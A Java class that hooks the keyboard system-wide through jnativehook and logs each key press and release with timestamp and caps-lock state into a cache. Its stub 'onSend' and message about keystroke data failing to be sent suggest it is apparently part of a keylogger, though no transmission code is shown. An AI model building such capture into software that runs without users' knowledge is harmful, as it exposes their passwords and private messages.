package keys;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.List;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import handlers.KeyStorage;

public class NativeKeyboard  implements NativeKeyListener{

	private List<KeyStorage> keyCache = new ArrayList<KeyStorage>();
	private static boolean capsLock;
	
	public NativeKeyboard() {
		capsLock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		if(e.getKeyCode() == KeyEvent.VK_CAPS_LOCK) capsLock = !capsLock;
		KeyStorage key = new KeyStorage(e.getKeyCode(), true, capsLock,  System.currentTimeMillis());
		keyCache.add(key);
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		keyCache.add(new KeyStorage(e.getKeyCode(), false, capsLock, System.currentTimeMillis()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) { 
		
	}
	
	public void onSend() {
		
	}
	
	public void onFail() {
		System.out.println("Keystroke data failed to be sent. ");
	}

	public List<KeyStorage> getKeyCache() {
		return keyCache;
	}
}
